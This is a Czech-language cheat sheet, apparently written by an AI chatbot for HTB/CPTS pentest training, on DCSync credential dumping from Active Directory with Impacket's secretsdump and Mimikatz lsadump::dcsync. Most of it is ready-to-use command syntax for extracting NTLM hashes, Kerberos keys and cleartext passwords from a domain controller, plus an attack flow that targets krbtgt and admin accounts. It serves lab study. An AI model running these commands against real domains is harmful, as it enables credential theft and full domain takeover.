# 🧠 DCSync / secretsdump – CHEATSHEET (HTB / AD)

## 🔥 1) Co je DCSync (core idea)

- Simuluješ Domain Controller
- taháš:
    - NTLM hash
    - Kerberos keys
    - (někdy) cleartext (reversible encryption)
- funguje jen pokud máš:

```
Replicating Directory ChangesReplicating Directory Changes AllReplicating Directory Changes In Filtered Set
```

---

# 🛠️ 2) IMPACKET SECRETDUMP – základní syntaxe

## ✔️ FULL DUMP (nejčastější)

```
secretsdump DOMAIN/USER:PASSWORD@DC_IP
```

---

## ✔️ s output file

```
secretsdump DOMAIN/USER:PASSWORD@DC_IP -outputfile dump
```

---

## ✔️ jen DCSync (jen DC data)

```
secretsdump -just-dc DOMAIN/USER:PASSWORD@DC_IP
```

---

## ✔️ jen NTLM hashe

```
secretsdump -just-dc-ntlm DOMAIN/USER:PASSWORD@DC_IP
```

---

## ✔️ jen konkrétní user

```
secretsdump -just-dc-user USERNAME DOMAIN/USER:PASSWORD@DC_IP
```

---

## ✔️ s DC IP (doporučeno vždy)

```
secretsdump -dc-ip DC_IP DOMAIN/USER:PASSWORD@DC_IP
```

---

# ⚠️ 3) SPRÁVNÝ FORMÁT LOGINU

```
DOMAIN/USER:PASSWORD@TARGET
```

### příklad:

```
INLANEFREIGHT/adunn:P@ssw0rd@10.10.10.10
```

---

# ❌ 4) NEJČASTĚJŠÍ CHYBY

## ❌ špatný flag

```
-outfile ❌
```

## ✔ správně

```
-outputfile
```

---

## ❌ špatný target (MS místo DC)

```
MS01 ❌
```

## ✔ správně

```
DC01 ✔
```

---

## ❌ zapomenuté heslo

```
Password:
```

→ znamená interactive mode + často fail

---

# 🧪 5) TYPICKÝ OUTPUT SOUBORY

Když použiješ `-just-dc`:

```
dump.ntdsdump.ntds.kerberosdump.ntds.cleartext
```

---

# 🧠 6) CO V TOM HLEDÁŠ

## NTLM hashes:

```
user:RID:LMHASH:NTHASH
```

---

## Kerberos keys:

- AES keys
- RC4 keys

---

## Cleartext (IMPORTANT)

```
proxyagent:CLEARTEXT:Password123!
```

👉 jen pokud:

- reversible encryption = ON

---

# 🔐 7) REVERSIBLE ENCRYPTION FLAG

## Jak ho poznáš:

```
userAccountControl = ENCRYPTED_TEXT_PWD_ALLOWED
```

nebo:

```
Store password using reversible encryption = TRUE
```

---

## co to znamená:

- heslo je **dešifrovatelné**
- není to hash-only model
- secretsdump ho umí vypsat

---

# 🧨 8) MIMIKATZ DCSYNC (alternativa)

```
lsadump::dcsync /domain:DOMAIN /user:DOMAIN\administrator
```

---

## příklad:

```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

---

# 🧠 9) RYCHLÝ MINDSET FLOW

```
Mám user   ↓Má DCSync práva?   ↓spustím secretsdump / mimikatz   ↓dostanu:   - NTLM hashes   - Kerberos keys   - možná cleartext   ↓hledám:   - krbtgt   - admin   - reversible encryption users
```

---

# 🚀 10) ULTRA RYCHLÁ VERZE (na zapamatování)

```
secretsdump DOMAIN/user:pass@DC -just-dc -outputfile dump
```

---

Pokud chceš, můžu ti z toho udělat ještě:

👉 „1-page CPTS cheat sheet (AD attacks flow: ACL → privesc → DCSync → DA)“

nebo

👉 mapu kdy použít:

- Kerberoast
- DCSync
- AS-REP roast
- ACL abuse

Tohle je přesně core AD pentest skill set.